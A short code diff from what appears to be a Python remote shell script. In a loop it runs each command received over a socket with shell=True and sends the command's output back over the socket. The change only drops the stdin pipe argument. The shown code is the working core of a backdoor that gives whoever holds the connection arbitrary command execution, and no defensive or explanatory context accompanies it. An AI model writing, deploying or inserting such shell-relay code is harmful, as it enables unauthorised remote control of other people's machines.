@@ -19,8 +19,7 @@ while 1:
         execute = subprocess.Popen(command, 
                                    shell=True, 
                                    stdout=subprocess.PIPE, 
-                                   stderr=subprocess.PIPE,
-                                   stdin=subprocess.PIPE)
+                                   stderr=subprocess.PIPE)
         result = execute.stdout.read() + execute.stderr.read() + "\n".encode()
         s.sendall(result)
 s.close()
